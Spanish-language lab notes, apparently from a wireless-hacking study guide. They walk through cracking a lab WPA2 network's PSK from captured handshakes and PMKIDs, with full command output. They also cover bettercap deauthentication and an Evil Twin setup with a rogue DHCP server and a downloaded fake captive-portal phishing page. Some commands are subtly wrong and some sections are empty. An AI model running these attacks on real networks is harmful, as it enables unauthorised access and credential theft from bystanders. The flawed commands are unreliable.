`Importante`: Un archivo de captura de handshake WPA2 (hccap) no contiene directamente un hash de contraseña como los algoritmos de hash MD5 o NTLM. En cambio, el archivo contiene información sobre el handshake capturado y otras características de la red WiFi como el ESSID o BSSID.

- [AirCrack & John the Ripper](https://charlesreid1.com/wiki/Aircrack_and_John_the_Ripper)

### Tipos de Cracking 

1. Passtrough (Normal, neceta una wordlist)

Requieren que los hashes precaprurados únicamente + un wordlist. Es el más sencillo pero más lento. 

2. Rainbow Table (Muy rápido, necesita una rainbow table .genpmk)

- [Rainbow tables: qué son y cómo funcionan las tablas arco iris](https://www.ionos.es/digitalguide/servidores/seguridad/rainbow-tables/)

PMK significa "Pairwise Master Key" o "Clave Maestra Par a Par" Genpmk es una herramienta que se utiliza para generar las claves de sesión necesarias para crear estas tablas arco iris a partir de los PMKs capturados durante la captura de paquetes en una red inalámbrica.

Los ataques Rainbow Table implican la creación previa de una tabla de búsqueda (Rainbow Table) que se compone de una gran cantidad de posibles combinaciones de contraseñas y valores hash correspondientes. Cuando se ejecuta el ataque Rainbow Table, el objetivo es buscar en la tabla el valor hash encriptado de la contraseña objetivo y encontrar una coincidencia. Si se encuentra una coincidencia, se puede determinar la contraseña original correspondiente.

3. DataBase (El más rápido, necesita una base de datos SQL, pero también la rainbow table ya que se crea apartir de una DB)

Los ataques por database no requieren la creación previa de una tabla de búsqueda. En su lugar, se utilizan las bases de datos de contraseñas preexistentes que se han recopilado a partir de fuentes como sitios web comprometidos o diccionarios de contraseñas. 

---

### Extraer `hccap` con `AirCrack` & `John the Ripper`

````sh

# Para extraer el hash de la PSK WPA2 con AirCrack hay 2 opciones:

    #  1. Extrarlo del .cap generado por la auditoría de Aircrack (ej. "Fz3r0_WiFi_Log-01.cap")

    #  2. Extrarlo del .pcap generado por la captura Wireshark o TCP-Dump (ej. "Fz3r0_4-way-handshake_2-STAs.pcap")

        # Importante que sea .pcap y NO la nueva extensión .pcapng!!!

# 1. Tirar comando para convertir el hash a formato Hashcat (.hccap):

   # J  - Crear archivo para Hashcat
   # El primero es el archivo que crearé, el segundo en mi file .cap

# Opción1: .cap file
aircrack-ng -J fz3r0_aircrack_hash_capture_cap Fz3r0_WiFi_Log-01.cap

# Opción2: .pcap file
aircrack-ng -J fz3r0_aircrack_hash_capture_pcap Fz3r0_4-way-handshake_2-STAs.pcap

   ## Resultado: 

   ## Building Hashcat file...
   ## 
   ## [*] ESSID (length: 13): Fz3r0_Air_PWN
   ## [*] Key version: 2
   ## [*] BSSID: 30:45:96:D7:F2:3E
   ## [*] STA: C8:94:02:B9:10:33
   ## [*] anonce:
   ## 01 69 6B F6 49 F0 DA 1E 9C 15 58 53 8B 44 D4 A2 
   ##     89 39 2F 39 60 4F 69 0F 94 39 ED 56 7A 47 A8 7A 
   ## [*] snonce:
   ##     7A A4 95 3F DB 0C EE E4 38 7C 22 8A 56 55 F2 1F 
   ##     C4 D0 53 ED 5E DD 80 A7 87 A2 6C 20 7E E7 CD 48 
   ## [*] Key MIC:
   ##     83 53 EF 10 38 29 28 40 72 62 59 1D 98 B6 30 9F
   ## [*] eapol:
   ##     01 03 00 77 02 01 0A 00 00 00 00 00 00 00 00 00 
   ##     01 7A A4 95 3F DB 0C EE E4 38 7C 22 8A 56 55 F2 
   ##     1F C4 D0 53 ED 5E DD 80 A7 87 A2 6C 20 7E E7 CD 
   ##     48 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
   ##     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
   ##     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
   ##     00 00 18 30 16 01 00 00 0F AC 04 01 00 00 0F AC 
   ##     04 01 00 00 0F AC 02 00 00 00 00 
   ## 
   ## Successfully written to fz3r0_aircrack_hash_capture.hccap  <<<--- Archivo Generado   

# 2. Aquí ya tengo un archivo "fz3r0_aircrack_hash_capture.hcap" que puedo extrar con john, mejor dicho hccap2john

hccap2john fz3r0_aircrack_hash_capture.hccap > fz3r0_hash_fromjohn

# 3. En este momento ya puedo leer el hash extraído del 4-way-handshake:

cat fz3r0_hash_fromjohn

   ## Resultado:

   ## File: fz3r0_hash_fromjohn
   ## ───────────────────────────────────────────────────────────
   ## Fz3r0_Air_PWN:$WPAPSK$Fz3r0_Air_PWN#A2KKpz6ym7E0iF.nSeGJDxg
   ## AviEsT088JZLm5wHEIypSrM0bVu7g65vbnIU/OKjqGT1O5dkJK3C9FBGWWH
   ## YjCK/DOEyICSpKSYScSU21.5Q0.Ec............/SeGJDxgAviEsT088J
   ## ZLm5wHEIypSrM0bVu7g65vbnIU.................................
   ## ................................41.K.E..1uk2.E..1uk2.E..1uk
   ## 0..........................................................
   ## ...........................................................
   ## ...........................................................
   ## ....../v.....U...6BHvl.s8GV.Qa7N5NWqA7w:c89402b91033:304596
   ## d7f23e:304596d7f23e::WPA2:fz3r0_aircrack_hash_capture.hccap  
````

### Bruteforce Cracking WPA/WPA2 PSK `John the Ripper`

````sh
# john no necesita presentación

# 1. Siempre que se tiene un hash es bueno intentar saber de qué tipo es (aunque en esta caso sabemos de donde viene)

    # Esto solo lo pongo como ejemplo, ya que en realidad estos hashed se identifican fácilmente por tener "$WPAPSK$" = WPA PSK, en el inicio. 

# Nota: En mi Parrot custom es mejor extraerlo con "catn"
hasid 'hash:test::fz3r0::::$hash_example!'

# 2. Crackearlo con John

# - No es necesario especificar el hash (ya que viene de un hash2john)
john --wordlist=/usr/share/wordlists/rockyou.txt fz3r0_hash_fromjohn

    ## Resultado:

    ## Created directory: /root/.john
    
    ## Warning: detected hash type "wpapsk", but the string is also recognized as "wpapsk-pmk" <<<----- 'wpapsk' id
    
    ## Use the "--format=wpapsk-pmk" option to force loading these as that type instead
    ## Using default input encoding: UTF-8
    ## Loaded 1 password hash (wpapsk, WPA/WPA2/PMF/PMKID PSK [PBKDF2-SHA1 256/256 AVX2 8x])
    ## Cost 1 (key version [0:PMKID 1:WPA 2:WPA2 3:802.11w]) is 2 for all loaded hashes
    ## Will run 16 OpenMP threads
    ## Note: Minimum length forced to 2 by format
    ## Press 'q' or Ctrl-C to abort, almost any other key for status
    
    ## godzilla2000     (Fz3r0_Air_PWN)  <<<---- PSK Crack!!!! :D
    
    ## 1g 0:00:04:07 DONE (2023-04-15 11:04) 0.004039g/s 7150p/s 7150c/s 7150C/s gogamecocks..godie101
    ## Use the "--show" option to display all of the cracked passwords reliably    

# Bonus!!! En caso de querer especificar el tipo de hash: 

# Buscar Formato WPA PSK
john --list=formats | grep -i 'wpapsk'

# Crackear con formato específico
john --wordlist=/usr/share/wordlists/rockyou.txt fz3r0_hash_fromjohn --format=wpapsk

# 3. Para leer el password nuevamente de la BD de john solo es necesario: 

john --show fz3r0_hash_fromjohn

    ## Resultado:

    ## Fz3r0_Air_PWN:godzilla2000:c89402b91033:304596d7f23e:304596d7f23e::WPA2:fz3r0_aircrack_hash_capture.hccap

    ## 1 password hash cracked, 0 left

        ## OJO! si ese resultado se lo "resto" al hccap, sabré exactamente cual es el hash únicamente del password

            ## Original:

# Fz3r0_Air_PWN:$WPAPSK$Fz3r0_Air_PWN#A2KKpz6ym7E0iF.nSeGJDxgAviEsT088JZLm5wHEIypSrM0bVu7g65vbnIU/OKjqGT1O5dkJK3C9FBGWWHYjCK/DOEyICSpKSYScSU21.5Q0.Ec............/SeGJDxgAviEsT088JZLm5wHEIypSrM0bVu7g65vbnIU.................................................................41.K.E..1uk2.E..1uk2.E..1uk0....................................................................................................................................................................................../v.....U...6BHvl.s8GV.Qa7N5NWqA7w:c89402b91033:304596d7f23e:304596d7f23e::WPA2:fz3r0_aircrack_hash_capture.hccap

            ## Quitándole remanentes (MACs, IDs, etc):

# A2KKpz6ym7E0iF.nSeGJDxgAviEsT088JZLm5wHEIypSrM0bVu7g65vbnIU/OKjqGT1O5dkJK3C9FBGWWHYjCK/DOEyICSpKSYScSU21.5Q0.Ec............/SeGJDxgAviEsT088JZLm5wHEIypSrM0bVu7g65vbnIU.................................................................41.K.E..1uk2.E..1uk2.E..1uk0....................................................................................................................................................................................../v.....U...6BHvl.s8GV.Qa7N5NWqA7w
````

### Bruteforce Cracking WPA/WPA2 PSK `aircrack-ng`

- [Cracking de Constraseñas con AirCrack-NG](https://esgeeks.com/cracking-claves-wifi-con-aircrack-ng/)

````sh
# 1. Solo es necesario especificar el wordlist y el archivo .cap extraído de la auditoría

    # -w = wordlist

# Lanzar comando de crackeo
aircrack-ng -w /usr/share/wordlists/rockyou.txt Fz3r0_WiFi_Log-01.cap

# Version .pcap papu pro
aircrack-ng -w /usr/share/wordlists/rockyou.txt Fz3r0_4-way-handshake_2-STAs.pcap

    ## Resultado:

##      [00:02:29] 1736755/14344392 keys tested (11789.42 k/s) 
##
##      Time left: 17 minutes, 44 seconds                         12.11%
##
##                       Current passphrase: godzilla2000               
##                         KEY FOUND! [ godzilla2000 ]    <<<---- WPA2 PSK Crack!!! :D
##
##      Master Key     : B0 9C C4 F9 29 FA C7 24 C0 56 D8 60 EB 52 CE F8 
##                       8E C9 0D 70 25 6B 58 0B 10 98 49 1D 57 B4 C6 09 
##
##      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
##                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
##                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
##                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
##      EAPOL HMAC     : 83 53 EF 10 38 29 28 40 72 62 59 1D 98 B6 30 9F 
````

### Bruteforce Cracking WPA/WPA2 PSK `cowpatty`

````sh

# Cowpatty es algo más lento que otras herramientas como Aircrack o John, también soporta .cap y .pcap

# 1. Lanzar comando, en esta herramienta se debe especificar el SSID

# Lanzar comando de crackeo
cowpatty -f /usr/share/wordlists/rockyou.txt -r Fz3r0_WiFi_Log-01.cap -s 'Fz3r0_Air_PWN'

# Version .pcap papu pro
cowpatty -f /usr/share/wordlists/rockyou.txt -r Fz3r0_4-way-handshake_2-STAs.pcap -s 'Fz3r0_Air_PWN'

    ## Resultado:

    ## The PSK is "godzilla2000".
    ##
    ## 916448 passphrases tested in 786.78 seconds:  1164.81 passphrases/second
````

### Bruteforce Cracking WPA/WPA2 PSK + Claves Pre-Computadas de DataBase `airolib-ng`

````sh

# airolib-ng es parte de aircrack-ng

    # - Se debe exportar una Base de Datos para generar las claves, yo lo nombraré 'fz3r0_airolib_pass_db'

    # - También se debe seleccionar un archivo .lst que contenga el nombre de los ESSID a crackear

# 1. Lanzar comando para crear la Base de datos en SQL, especificando 'passwd'

airolib-ng fz3r0_airolib_pass_db --import passwd /usr/share/wordlists/rockyou.txt 

    # Esta DB se puede verificar como cualquier otra DB de SQL:

file fz3r0_airolib_pass_db    

    ## Ejemplo: fz3r0_airolib_pass_db: SQLite 3.x database, last written using SQLite version 3034001

# 2. Crear el .lst con el nombre (o nombres) del ESSID, yo lo nombraré 'fz3r0_airolib_essid.lst'

echo 'Fz3r0_Air_PWN' > fz3r0_airolib_essid.lst

# 3. Ahora lanzar el comando para importar el SSID a la DB creada anteriormente, así como se hizo con la DB pero ahora especificando 'essid'

airolib-ng fz3r0_airolib_pass_db --import essid fz3r0_airolib_essid.lst

# 4. Para comprobar que ambas cosas se hayan generado y cargado bien en la Base de Datos, se puede ejecutar --stats

airolib-ng fz3r0_airolib_pass_db --stats

    ## Ejemplo: 

    ## There are 1 ESSIDs and 9611374 passwords in the database. 0 out of 9611374 possible combinations have been computed (0%).
    ## 
    ## ESSID   Priority    Done
    ## Fz3r0_Air_PWN   64  0.0    

# 5. Es recomendable a estas alturas limpiar el archivo y revisar la integridad con --clean all:

airolib-ng fz3r0_airolib_pass_db --clean all 

# 6. Ahora ya puedo generar el archivo de claves pre-computadas (esto puede llevar tiempo y también se puede parar con ctrl+c): 

airolib-ng fz3r0_airolib_pass_db --batch

# 7. Una vez creada la DB ahora puedo lanzar el ataque con DB con aircrack-ng, muy similar con wordlist, pero sin usar -w, aquí se usa -r directamente + DB + .cap/.pcap

# Lanzar comando de crackeo
aircrack-ng -r fz3r0_airolib_pass_db Fz3r0_WiFi_Log-01.cap

aircrack-ng -r fz3r0_airolib_pass_db Fz3r0_4-way-handshake_2-STAs.pcap

    ## Resultado: (tomó solo un par de segundos en VM)

    ##                          KEY FOUND! [ godzilla2000 ]
    ##                                Aircrack-ng 1.6 
    ## 
    ##       [00:00:04] 916446/0 keys tested (259513.22 k/s)  <<<---- Brutal Speed!!! :O 
    ## 
    ##       Time left: 822709428 days, 12 hours, 39 minutes, 28 seconds      inf%
    ## 
    ##                          KEY FOUND! [ godzilla2000 ]
    ## 
    ## 
    ##       Master Key     : B0 9C C4 F9 29 FA C7 24 C0 56 D8 60 EB 52 CE F8 
    ##                        8E C9 0D 70 25 6B 58 0B 10 98 49 1D 57 B4 C6 09 
    ## 
    ##       Transient Key  : 5D 41 D1 F6 F5 87 93 BE A3 DB BB 90 F8 74 F9 66 
    ##                        CD 51 B6 97 4A 17 17 3D 12 BA 46 21 1A 1E 65 01 
    ##                        70 C3 F1 D2 0F 88 B0 4B 3E B5 9B AB 52 35 F1 58 
    ##                        28 0F 12 4C 30 74 94 F0 97 99 B1 D4 6E A7 74 72 
    ## 
    ##       EAPOL HMAC     : 83 53 EF 10 38 29 28 40 72 62 59 1D 98 B6 30 9F     
````




## Rainbow Tables Y Cracking con Hashcat Y John the Ripper

- [How to use precomputed tables to crack Wi-Fi passwords in Hashcat and John the Ripper](https://miloserdov.org/?p=5167)

Las Rainbow Table de Wi-Fi se pueden generar mediante el programa `wlangenpmkocl` del paquete `hcxkeys`.

El paquete hcxkeys incluye dos utilidades:

- `wlangenpmk`: genera Master Keys sin cifrar (**usando CPU**) a partir de ESSID y contraseña para usar en `hashcat` (con el modo hash `2501`) o `John the Ripper` (tipo de hash `wpapsk-pmk`).
- `wlangenpmkocl`: genera claves maestras sin cifrar (**usando GPU**) a partir de ESSID y contraseña para usar en `hashcat` (con el modo hash `2501`) o `John the Ripper` (tipo de hash `wpapsk-pmk`).

Es decir, la única diferencia entre ellos es que `wlangenpmkocl` utiliza una `tarjeta de video`, mientras que `wlangenpmk` utiliza un `procesador`. Por supuesto, es preferible utilizar la versión de la tarjeta gráfica (es decir, `wlangenpmkocl`). La versión de wlangenpmk solo se utiliza como último recurso cuando no se dispone de una tarjeta de video discreta o no se puede instalar su controlador para obtener soporte completo de OpenCL, **por ejemplo cuando se usa máquina virtual!!!**

### Instalar `hcxkeys`

Para usar wlangenpmkocl, se deben instalar los drivers de tarjeta de video (para explotar al máximo la funcionalidad). La información sobre esto y sobre OpenCL se puede encontrar en los artículos:

- [Instalación de controladores de video en Linux](https://miloserdov.org/?p=4961#132)
- [Cómo forzar contraseñas usando GPU y CPU en Linux](https://miloserdov.org/?p=4726)

Instalación:

````sh
sudo apt install openssl opencl-headers git # esto es opcional, solo si tienes algún problema
git clone https://github.com/ZerBea/hcxkeys
cd hcxkeys/
make
sudo make install
````

1
2
3
4
5
sudo apt install openssl opencl-headers git # esto es opcional, solo si tienes algún problema
git clone https://github.com/ZerBea/hcxkeys
cd hcxkeys/
make
sudo make install








## Rainbow Tables con genpmk 


### Creación de Rainbow Tables con genpmk

- [Utilizando Cowpatty y Pyrit para optimizar ataques por diccionario contra WPA/WPA2](https://thehackerway.com/2012/05/17/wireless-hacking-utilizando-cowpatty-y-pyrit-para-optimizar-ataques-por-diccionario-contra-wpawpa2-parte-xv/)

````sh

# 1. Lanzar comando para crear la rainbow table (En mi caso se llamara 'fz3r0_genpmk_rainbow_table.genpmk')

    # -f : seleccionar wordlist
    # -s : SSID
    # -d : output file .genpmk

genpmk -f /usr/share/wordlists/rockyou.txt -s 'Fz3r0_Air_PWN' -d fz3r0_genpmk_rainbow_table.genpmk    

# La tabla tardará un poco en crearse, se puede detener con ctrol+c
````

### Cowpatty VS Rainbow Table Cracking

````sh

# Este ataque es muy similar al passthrough pero se debe especificar la rainbow table .genpmk creado anteriormente + .pcap + el SSID

# 1. Lanzar comando: 

cowpatty -d fz3r0_genpmk_rainbow_table.genpmk -r Fz3r0_4-way-handshake_2-STAs.pcap -s 'Fz3r0_Air_PWN'

    ## Resultado: 

    ## The PSK is "godzilla2000".
    ##     
    ## 916448 passphrases tested in 1.65 seconds:  557048.62 passphrases/second    <<<---- Casi 2 millones en segundo y medio (en una VM)
````


### Ataque por Base de Datos

- Esto queda pendiente porque es con pyrit y por ahora no funciona nada bien... Peeero es el ataque más rapido

---


┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                     Xerosploit Installer                     █
█                                                              █
└══════════════════════════════════════════════════════════════┘ 

















---

<!-- 

FIN DE CAPITULO :D

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

 -->

<p align="center"> <img src="https://user-images.githubusercontent.com/94720207/228101704-c07ced92-e331-446c-aa7e-5d00018e2429.gif" alt="Encapsula" height=110px/> </a> </p> 

<br>
<br>
<br>

## 💀⚔️ Ataque: `PMKID` (WLANs sin clientes)

En una WLAN protegida por una `PSK`, el `AP` y `STA` que se conectan a el comparten una `clave secreta` conocida como **`Pairwise Master Key (PMK)`**. 

- La `PMK` se utiliza para **encriptar las comunicaciones entre el `AP` y las `STA` que se conectan a él.

En un ataque `PMKID/RSN`, el atacante busca obtener la `PMK` de la `WLAN` **sin necesidad de conectarse a ella**. 

- El ataque funciona explotando una debilidad en el protocolo de autenticación `RSN (Robust Security Network)` _(utilizado en las redes inalámbricas modernas)_. En particular, el ataque explota el hecho de que **algunos `AP`** responden a solicitudes de autenticación **sin requerir la presentación de un cliente válido.** Esto permite al atacante enviar solicitudes de autenticación falsas que contienen una serie de valores específicos que provocan que el punto de acceso envíe de vuelta un PMKID (identificador de PMK) que contiene información sobre la PMK de la red inalámbrica.

**Una vez que el atacante ha obtenido el `PMKID`, puede intentar romper la PSK y obtener la PMK real. Esto se hace utilizando herramientas de cracking de contraseñas que utilizan técnicas como el diccionario y la fuerza bruta para probar diferentes combinaciones de contraseñas hasta que se encuentre la correcta.**

---

### 💣💥 Alcances del Ataque

- Solo funciona para WLANs con `WPA` o `WPA2`
- **NO** funciona para `WPA3` o `WEP` o `WPA2 Enterprise 802.1X`
- **NO** funciona en todos los AP o Routers, solo los que tienen función de itinerancia habilitada. 

---

### 📽️ 📖 Ejemplos:

- [Auditoria inalámbrica PMKID con Airgeddon](https://www.youtube.com/watch?v=A-ccvywjOKc)

---

### 🥷🕵️ Métodos para obtener `PMKID`

1. **`betterrcap`**: 

````sh
# **** Tener el adaptador en monitor

# 1. Ejecutar Bettercap en ese adaptador
bettercap -iface wlan0mon

# 2. Dentro de Bettercap ejecutar el reconocimiento de red
wifi.recon on

# 3. Ejecutar el assoc para todas las redes (Se ejecutará e irá guardando un archivo .pcap)
wifi.assoc all 

    # En este punto el .pac ya tendrá lso hashed del RSN PMKID
````

2. **`hcxdumptool`**

````sh
# 1. Realizar una captura desde hcxdumptool
# -i = interface
# -o = output
# --enable_status=1 
hcxdumptool -1 wlan0mon -o Fz3r0_RSN_PMKID --enable_status=1
````

---

### 🗡️🎩 Cracking: `PMKID`

2. Crackear los hashes con `hcxdumptool`

````sh
# 1. Primero mostrar los hashes de la captura y guardarlos en un archivo
# -z Nombre de archivo de hashes
hcxdumptool -z Fz3r0_Hashes Fz3r0_RSN_PMKID

# 2. Una vez guardados se pueden ver con un simple cat y poderlos empezar a crackear
cat Fz3r0_Hashes

# 3. Opción con john: Guárdame este fierrito, Crack it!
john --wordlist=/usr/share/wordlists/rockyou.txt Fz3r0_Hashes

# - Revisar la DB de john
john --show Fz3r0_Hashes

# 3. Opción con Hashcat: Guárdame este fierrito, Crack it!
hashcat --example-hashes | grep "16800" -C 2

hashcat -m 16800 -a 0 Fz3r0_Hashes /usr/share/wordlists/rockyou.txt

hashcat -m 16800 --show Fz3r0_Hashes
````

























---

## WiFi Pumpkin

https://wifipumpkin3.github.io/



 





































---

## Bettercap

- https://github.com/bettercap/bettercap/issues/819 
- https://null-byte.wonderhowto.com/how-to/hack-wi-fi-networks-with-bettercap-0194422/

creo esto soluciona todo lol!!!!

instalar:

````sh
wget http://old.kali.org/kali/pool/main/libp/libpcap/libpcap0.8_1.9.1-4_amd64.deb

dpkg -i libpcap0.8_1.9.1-4_amd64.deb

````

````sh

## Proceso de Captura e isolación de handshakes:

# 1. Poner la interface en modo monitor, auditar la red es opcional

airmon-ng check kill && airmon-ng start wlan0 && airodump-ng wlan0mon -c 6

# 2. Seleccionar la interface en modo monitor (wlan0mon) para bettercap (Se entra a consola wlan0mon)

bettercap -iface wlan0mon

# 3. Dentro de la consola de Ethercap se utilizará sintaxis de Ethercap, comenzando con recon de WLAN:

# Paso1: Sin filtros
wifi.recon on

# Paso2: Ahora filtrando clientes de manera descendiente (se escibe ahi mismo en consola)
set wifi.show.sort clients desc

# Paso3: Seleccionar las acciones del ticker cada segundo (clear & wifi.show)
set ticker.commands 'clear; wifi.show'

# Paso4: Mostrar el ticker de manera más cómoda
ticker on

# - Seleccionar unicamente un canal
wifi.recon.channel 6

# 4. Deauth Attack

# Paso1: Solo es necesario el comando wifi.death seguido del BSSID o SSID

wifi.deauth SSID/BSSID

# Salir:

ctrl + Z

# Matar ultimo proceso 

kill %

# Para copiar los handshakes guardados antes de que sea sobreescrito

cp /root/bettercap-wifi-handshakes.pcap ./fz3r0_bettercap_4-way-handshake_capture.pcap
````





























## Xerosploit

Xerosploit is a penetration testing toolkit whose goal is to perform man in the middle attacks for testing purposes. It brings various modules that allow to realise efficient attacks, and also allows to carry out denial of service attacks and port scanning. Powered by bettercap and nmap.

- [Man in the Middle con Xerosploit](https://sospedia.net/man-in-the-middle-con-xerosploit/#:~:text=La%20herramienta%20Xerosploit%20es%20un,de%20nuestro%20equipo%20al%20router.)

### Instalar

````sh
    ## Instalación

# 1. En primer lugar nos descargaremos Xerosploit ejecutando este comando en una terminal:

git clone https://github.com/LionSec/xerosploit.git

# 2. A continuación entraremos en la carpeta que se habrá creado con el nombre xerosploit y ejecutamos el siguiente comando:

python3 install.py

# 3. Una vez que se complete la instalación podremos iniciar el programa simplemente tecleando xerosploit en la terminal.

xerosploit
````























### Funny Attacks con xerosploit

````sh

````
















































































# 👹 `CANTO V`: Evil Twin Attack

El ataque **`Evil Twin`** es un tipo de ataque que se lleva a cabo en redes WiFi `IEEE 802.11`, en el cual **un atacante crea una red falsa que se parece a una red legítima para engañar a los usuarios y hacer que se conecten a ella. Una vez que los usuarios se conectan a la red falsa, el atacante puede interceptar y manipular el tráfico de Internet que pasa a través de ella.**

- En un `manual setup` de ataque `Evil Twin`, **el atacante crea su propia red WiFi falsa desde cero**, utilizando herramientas para crear su propio `AP`, `DHCP server`, `portal cautivo`, `routing interno`, `base de datos SQL`, entre otros **componentes necesarios para proveer Internet al cliente**.
- **Existen herramientas automatizadas que simplifican la creación del ataque "Evil Twin".** Estas herramientas incluyen programas como Airgeddon, Fluxion y Wifiphisher, que automatizan gran parte del proceso de creación del ataque, desde la creación del AP y la red falsa hasta la captura y manipulación del tráfico de Internet.

**Una vez que los usuarios se conectan a esta red falsa, el atacante puede llevar a cabo diferentes tipos de ataques,** como `phishing`, `Man-in-the-Middle (MiTM)`, `Packet Inyection`, `suplantación de identidad`, `denegación de servicio (DoS)`, y `redireccionamiento de tráfico a páginas maliciosas`.

Con este tipo de ataques en realidad no se está atacando directamente a la red que se está "clonado", sino que se está tratando de engañar a la víctima. Aunque hay casos donde si se ataca también a la WLAN original en caso que se necesite hacer `Deauthentication Attack`.

Se podría decir que este tipo de ataque podría "vulnerar" de cierta manera casi cualquier tipo de seguridad, aunque no crackeando hashes como con otras técnicas, sino obteniendo directamente la información del usuario en caso que caiga en la trampa. Aunque de manera directa no vulnera ninguna seguridad, sino utiliza al usuario mismo para obtener la contraseña de por ejemplo un portal con **`WPA2 Enterprise 802.1X`**

- **`Evil Twin` se utiliza para obtener contraseñas que no pueden ser obtenidas tán fácilmente o que no pueden ser crackeadas, para ataques de Ingeniería Social y Phishing y también para hacer MiTM para sniffing de tráfico o redireccionamiento a páginas maliciosas. Incluso ataques más avanzados pueden llevar a un foothold para crear reverseshell en alguna máquina víctima.**  

![image](https://github.com/Fz3r0/Fz3r0_-_BlackShark/assets/94720207/0a364031-b1cc-4bde-b2d3-f18e5ddad5e8)

---

### Ejemplos

- [Evil Twin Attack con airgeddon](https://diegoaltf4.com/evil-twin/)

## Evil Twin Attack: `Manual Full Process`

La idea de este ataque es montar todo uin "servicio" de WiFi, donde incluye el AP, el servidor DHCP y la salida a Internet...

- Esto se hace para "engañar" a la víctima y que en todo momento parezca que se está conectando al servicio normal de Internet público, pasando por un portal cautivo, etc...
- Al finalizar "escucharemos" lo que digite en el portal fake para así obtener las credenciales de acceso del portal real o algún otro dato, como acceso a redes sociales, etc...
- También se pueden hacer otros ataques típicos de MiTM, ya que este ataque se considera MiTM aunque técnicamente no es exactamente eso... Ya que en realidad estamos escuchando en el aire y confundiendo a un usuario

**`Importante`: Si se usa VM se debe usar en modo bridged para compartir misma subnet real, no usar NAT!!!!**

---

### Evil Twin: Crear configuración `dhcpd.conf`

````sh
## OJO!!! Recordar que si se usa VM debe estar en bridged para tener el mismo rango de subnet eue la PC base

## 1. Cración del Servidor DHCP(deamon) [usando Sublime Text]

    # - Revisar la subnet donde estamos para crear el DHCP dentro de la misma red

ifconfig eth0

#   eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
#         inet 192.168.1.75  netmask 255.255.255.0  broadcast 192.168.1.255 <<<----| Guardar subnet (192.168.30.128 255.255.255.128 (range 128-255))   

subl /etc/dhcp/dhcpd.conf
````
- `dhcpd.conf`

````python
# Show that we want to be the only DHCP server in this network:
authoritative;
# Lease Times
default-lease-time 3600;
max-lease-time 7200;
# Set up our desired subnet:
subnet 192.168.1.128 netmask 255.255.255.128 {
    option subnet-mask 255.255.255.128;
    option broadcast-address 192.168.1.255;
    option routers 192.168.1.129;
    # Use Google public DNS server
    option domain-name-servers 8.8.8.8, 8.8.4.4;
    range 192.168.1.150 192.168.1.200;
}
````

---

### Evil Twin: `Fake Captive Portal Forging`

````sh
    ## Preparar /var/www/html para trabajar con el captive portal (como cualquier proyecto de diseño Web) 

# One-Liner Descarga Plantilla Fake Captive Portal: 

cd /var/www/html ; rm *; rmdir *; wget https://cdn.rootsh3ll.com/u/20180724181033/Rogue_AP.zip &>/dev/null; unzip Rogue_AP.zip &>/dev/null; rm -r __MACOSX ; rm Rogue_AP.zip ; mv Rogue_AP/* . ; rm -r Rogue_AP &>/dev/null && clear; echo "Fz3r0 Fake Captive Portal auto download complete!!! Enjoy!!!";echo ""; ls

# 1. Ir al directorio default del local host html:
cd /var/www/html 

# 2. Eliminar todo para que no estorbe, respaldar cualquier cosa!!!
rm * && rmdir *

# 3. Descargar la plantilla de muestra (O hacer nuestro propio Captive Portal)
wget https://cdn.rootsh3ll.com/u/20180724181033/Rogue_AP.zip

# 4. Descomprimir
unzip Rogue_AP.zip

# 5. Borrar directorios adicionales que se hayan creado
rm -r __MACOSX && rm Rogue_AP.zip

# 6. Para trabajar directamente desde root de html como en cualquier diseño web, tragio los archivos a la carpeta /var/html directo
mv Rogue_AP/* .

# 7. Borrar la carpeta que quedó como remanente
rm -r Rogue_AP

# 8. Ahora ya sea que haya descargado la plantilla o haya creado mi propio portal se debe ver algo así /var/www/html

    ## .rw-r--r-- root root 703 B  Sun Aug 30 10:13:16 2015  bg.jpg
    ## .rw-r--r-- root root 696 B  Tue Feb  7 12:48:08 2017  dbconnect.php
    ## .rw-r--r-- root root 1.7 KB Wed Nov 25 11:37:48 2015  index.html
    ## .rw-r--r-- root root  16 KB Sun Aug 30 10:13:16 2015  loading.gif
    ## .rw-r--r-- root root  42 KB Sun Aug 30 10:13:16 2015  logo.png
    ## .rw-r--r-- root root  35 KB Sun Aug 30 10:13:16 2015  masthead.jpg
    ## .rw-r--r-- root root 1.8 KB Sun Aug 30 10:13:16 2015  style.css
